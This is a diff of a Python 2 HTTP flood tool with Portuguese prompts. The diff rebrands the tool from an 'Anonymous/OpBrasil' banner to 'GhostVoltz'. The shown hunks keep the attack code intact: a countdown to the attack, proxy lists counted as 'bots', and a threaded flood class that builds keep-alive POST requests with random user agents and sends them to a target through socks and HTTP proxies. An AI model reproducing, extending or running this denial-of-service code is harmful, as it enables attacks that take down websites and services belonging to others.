@@ -1539,7 +1539,7 @@ print """ \033[1;32m
 +----------------------------------- #BL4CK L1V3S M4TTE3S# --------------------------------------+  
    \033[1;36m  
 				
-	\033[1;36mAnonymous : \033[1;44mGhostVoltz \033[0;m\033[1;46m  \033[0;m
+	\033[1;36m \033[1;44mGhostVoltz \033[0;m\033[1;46m  \033[0;m
    TikTok : @GhostVoltz_
                                                
 \033[0;m 
@@ -1570,7 +1570,7 @@ while n<2:
   print"Escolha um numero"
 while n<3:
  try:
-  th=input("\n\nZumbis:\n>")
+  th=input("\n\nFantasmas:\n>")
   n+=1
  except:
   print"Escolha um numero"
@@ -1684,7 +1684,7 @@ p4=p[2]
 print"\nsocks4 : ", len(p4)
 p5+=p[3]
 print"\nsocks5 : ",len(p5)
-print"\nTotal bots : ",len(h)+len(p4)+len(p5),"\n"
+print"\nGhosts : ",len(h)+len(p4)+len(p5),"\n"
 for bh in range(5):
  sys.stdout.write("\rAtaque comecando em : {}".format(5-bh))
  sys.stdout.flush()
@@ -1750,7 +1750,7 @@ class flood(threading.Thread):
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),url,par)
      try:
       s.send(m)
-      print"[!]Proxy: {} | Bytes: {} | \033[1;42mCONECTADO\033[0;m | MSGM: \033[1;41mOpBrasil!\033[0;m |".format(ipp,len(m)) ##@AnonymoThugLife## <3
+      print"[!]Proxy: {} | Bytes: {} | \033[1;42mCONECTADO\033[0;m | MSGM: \033[1;41mGhostVoltz\033[0;m |".format(ipp,len(m)) ##@GhostVoltz_## <3
      except Exception as dx:
       pass
     s.close()
